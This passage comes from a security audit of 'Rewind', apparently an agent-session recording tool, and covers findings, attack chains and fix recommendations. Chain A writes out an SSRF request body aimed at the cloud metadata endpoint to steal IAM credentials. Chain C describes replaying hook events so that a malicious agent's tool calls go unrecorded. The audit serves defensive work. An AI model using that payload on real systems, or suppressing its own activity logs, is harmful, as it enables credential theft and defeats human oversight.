Originally: "Version Information Exposed in Health Endpoints." Dropped because Rewind is an open-source binary — the version is trivially fingerprintable from behavior, so hiding the banner buys nothing. Note preserved for numbering continuity; the proxy health endpoint still exposes `session_id` and `step_count` which is a minor information leak, folded into CRITICAL-02's auth recommendation.

---

### LOW-05: Python SDK Sensitive Key Filtering is Incomplete

**Severity:** Low
**Affected component:** `python/rewind_agent/recorder.py:31-34`

**Description:**
The sensitive key filter uses a hardcoded frozenset:
```python
_SENSITIVE_KEYS = frozenset({
    "api_key", "api_secret", "authorization", "x-api-key",
    "secret", "password", "token", "access_token", "refresh_token",
})
```
This misses: `private_key`, `client_secret`, `aws_secret_access_key`, `bearer`, `credentials`, and keys nested inside dict values (only top-level keys are checked).

**Impact:** Some credentials may not be redacted from recorded data.

**Recommended fix:** Use pattern-based matching (regex for `.*key.*`, `.*secret.*`, `.*token.*`, `.*password.*`) and recursively scan nested dict values.

---

### LOW-06: `unwrap()` on DateTime Parsing Throughout Store

**Severity:** Low
**Affected component:** `crates/rewind-store/src/db.rs:465` and ~15 other `row_to_*` functions

**Description:** `DateTime::parse_from_rfc3339(...).unwrap()` is used throughout `row_to_*` functions. If the database contains a malformed timestamp (from manual SQL edits, corruption, or a bug), this panics and crashes the server.

**Impact:** A single corrupted database row crashes the server.

**Recommended fix:** Use `.unwrap_or_default()` or return a `rusqlite::Error` to skip the malformed row.

---

### LOW-07: `REWIND_DATA` Environment Variable Allows Data Directory Hijack

**Status:** ✅ **Fixed in PR #137** — `Store::open()` now validates that the data directory is owned by the current user (`geteuid` on unix). Directories owned by other users are rejected with a clear error. Group/world-writable directories are auto-tightened to 0700 with a warning. Python SDK logs a warning on uid mismatch.
**Severity:** Low
**Affected component:** `crates/rewind-store/src/db.rs:1696` (`dirs_path()`)

**Description:**
`Store::open_default()` reads the data directory from the `REWIND_DATA` env var without validating ownership or permissions:
```rust
fn dirs_path() -> PathBuf {
    if let Ok(data_dir) = std::env::var("REWIND_DATA") {
        return PathBuf::from(data_dir);
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
    PathBuf::from(home).join(".rewind")
}
```

A compromised shell init file (`.zshrc`, `.bashrc`, `.profile`) or a malicious process with the ability to set environment variables for the Rewind invocation can silently redirect storage to:
- A world-writable directory (attacker can read/modify sessions)
- A directory containing a pre-existing `rewind.db` with crafted data (log injection, XSS payloads in session names that later render in the UI)
- A symlink that causes writes to attacker-controlled locations

**Impact:** Silent redirection of recorded data to attacker-controlled locations. Combined with HIGH-03 (no file permissions) and MEDIUM-07 (fragile XSS) this could chain into a full local compromise.

**Recommended fix:**
- In `Store::open()`, check that the data directory is owned by the current user (`metadata.uid() == geteuid()`)
- Refuse to open a directory that is world-writable or group-writable (unless explicitly overridden)
- Log the resolved path at startup so the user can spot unexpected locations
- Apply alongside HIGH-03's 0700/0600 permission enforcement

---

## 4. Attack Chains

### Chain A: Network-Bound Full Compromise (Critical)

```
Precondition: Server bound to 0.0.0.0 (documented K8s use case)

Step 1: Network scan -> discover Rewind on port 4800 (no auth)
Step 2: GET /api/sessions -> list all recorded agent sessions
Step 3: GET /api/steps/{id} -> read full LLM request/response bodies
         -> Extract API keys from recorded Authorization headers
         -> Extract PII, proprietary code from prompts
Step 4: POST /api/sessions/{id}/export/otel
         body: {"endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
         -> SSRF to cloud metadata -> extract IAM credentials
Step 5: Use stolen IAM credentials + LLM API keys for further lateral movement

Impact: Full credential theft, data exfiltration, cloud account compromise
Combines: CRITICAL-01 + CRITICAL-02
```

### Chain B: Local Privilege Escalation via Shared Machine (High)

```
Precondition: Multi-user machine or compromised low-privilege process

Step 1: Read ~/.rewind/objects/* (world-readable files)
         -> Access all recorded LLM conversations
Step 2: Read ~/.rewind/rewind.db
         -> Extract transcript_path metadata -> learn project structure
Step 3: If Rewind server is running, access localhost:4800
         -> Use query_raw with PRAGMA to disable foreign keys
         -> Inject malformed session data
Step 4: (Contingent on share.rs regressing — LOW ex-MEDIUM-07 is not
         exploitable today.) If a future edit drops an `esc()` wrapper,
         XSS payload in tool_name executes when user opens shared HTML.

Impact: Data theft; browser-context code execution contingent on future regression
Combines: HIGH-03 + HIGH-02 + LOW (ex-MEDIUM-07)
```

### Chain C: Hook Event Suppression + Blind Spot Creation (High)

```
Precondition: Attacker can send HTTP to localhost:4800

Step 1: Observe or predict a legitimate hook envelope
         (source, event_type, timestamp, payload known or scriptable)
Step 2: Replay the exact envelope to POST /api/hooks/event
         -> The dedup cache blocks the *real* event as a "duplicate" for 60s
Step 3: Malicious agent tool calls in that window are not recorded
Step 4: User inspects session -> sees incomplete/clean activity log

Impact: Attacker can hide malicious agent activity from the debugger
Combines: MEDIUM-09 (hook replay, ex-HIGH-04) + MEDIUM-05 (no rate limiting)
```

### Chain D: Proxy MITM + Credential Harvest (High)

```
Precondition: User runs `rewind record --insecure`

Step 1: Network attacker performs ARP spoofing or DNS poisoning
Step 2: MITM the TLS connection to LLM API (accepted due to --insecure)
Step 3: Capture Authorization: Bearer sk-... headers
Step 4: Capture all prompts/responses (may contain secrets, PII)
Step 5: Optionally modify responses to manipulate agent behavior

Impact: API key theft, prompt exfiltration, agent manipulation
Combines: HIGH-05 + HIGH-01
```

---

## 5. Secure Design Recommendations

### Ship Order (one PR per row, in this sequence)

Reordered per peer review — fail-closed auth first, then SSRF, then redaction, then the rest.

| # | Recommendation | Addresses | Effort | Status |
|---|----------------|-----------|--------|--------|
| **1** | Fail closed on non-loopback bind without `--auth-token`. Generate default token on first run. Apply to HTTP + WebSocket + OTLP ingest routes. | CRITICAL-02, MEDIUM-09 (WS) | Medium | ✅ Shipped (PR #133) |
| **2** | Deny private/link-local/loopback in `export/otel` endpoint resolver | CRITICAL-01 | Small | ✅ Shipped (PR #134) |
| **3+4** | Blob redaction (request + response), hop-by-hop header denylist, `query_raw` lockdown, `pragma_table_info()` | HIGH-01, HIGH-02, HIGH-06, MEDIUM-06, MEDIUM-08 | Medium | ✅ Shipped (PR #135) |
| **5** | `chmod 0700 ~/.rewind/` and `0600` on files in `Store::open()`; add owner check on `REWIND_DATA` path | HIGH-03, LOW-07 | Small | ✅ Shipped (PR #137) |

### Next Tier (P2 — ship after the above)

| Recommendation | Addresses | Effort |
|----------------|-----------|--------|
| Require auth on hook replay; use full SHA-256 as dedup key; TTL-based eviction | MEDIUM-09 (formerly HIGH-04) | Small |
| Prominent warning + `--i-understand-the-risks` gate for `--insecure` | HIGH-05 | Small |
| Replace `std::sync::Mutex` with `parking_lot::Mutex` | MEDIUM-04 | Small |
| Add rate limiting on write endpoints via `tower-governor` | MEDIUM-05 | Medium |
| Atomic file swap for hook buffer drain | MEDIUM-03 | Small |
| Periodic LRU cleanup of `HookIngestionState.sessions` | MEDIUM-02 | Small |

### P3 (nice to have)

| Recommendation | Addresses | Effort |
|----------------|-----------|--------|
| Disk usage monitoring + configurable retention | LOW-01 | Medium |
| Larger broadcast channel buffer or unbounded channel | LOW-02 | Small |
| Minimum prefix length for session resolution | LOW-03 | Small |
| Regex-based sensitive key redaction in Python SDK | LOW-05 | Small |
| `.unwrap_or_default()` in `row_to_*` functions | LOW-06 | Small |
| CSP meta tag + invariant comment in `share.rs` | LOW (ex-MEDIUM-07) | Small |

### Code-Level Fixes

1. **Proxy header filtering** — Add a denylist for hop-by-hop headers and consider stripping `Authorization`/`x-api-key` from stored blobs.

2. **Dedup hash size** — Use full SHA-256 (or 128-bit) instead of truncated 64-bit for the dedup cache key.

3. **Buffer drain atomicity** — Replace read-then-truncate with atomic file swap (`rename` pattern) or file locking.

4. **Mutex poisoning** — Replace all `.lock().unwrap()` in proxy and WebSocket handlers with `.lock().map_err(...)`.

5. **DateTime parsing** — Replace `.unwrap()` with `.unwrap_or_default()` in all `row_to_*` functions to prevent panics on corrupt data.

6. **Python SDK sensitive keys** — Use regex-based pattern matching and recursive scanning for nested dicts.

### Operational Security

1. **Document data sensitivity** — Users should know that `~/.rewind/` contains full LLM conversations that may include API keys, PII, and proprietary code.

2. **CI/CD environments** — Warn against running Rewind in CI without cleanup, as recorded sessions may persist and be accessible to other jobs.

3. **Container deployments** — When deploying with `0.0.0.0` binding, require authentication and use network policies to restrict access.

4. **Shared HTML files** — Warn users that exported HTML files contain full session data and should be treated as sensitive.

---

## 6. Items NOT Found (Positive Findings)

The following common vulnerability classes were **not found** and represent good security practices in the codebase:

- **SQL Injection** — All database queries use parameterized queries via `rusqlite::params!` macro. No string interpolation in SQL (except the noted `format!` for PRAGMA which uses trusted input).
- **Path Traversal in Blob Store** — The blob store uses SHA-256 hashes as paths with length validation (`hash.len() < 3` check). No user-supplied paths reach the filesystem.
- **Dependency Supply Chain** — No obviously malicious or typosquatted dependencies observed in `Cargo.lock` or `package-lock.json`.
- **Memory Safety** — No `unsafe` code blocks found in any of the 11 crates. Rust's ownership model prevents common memory corruption bugs.
- **Frontend XSS in React App** — The React frontend uses JSX which auto-escapes by default. No `dangerouslySetInnerHTML` usage found in the web UI source.
- **CSRF** — Not applicable in the current design as there are no cookie-based sessions. All state changes are via JSON API calls.
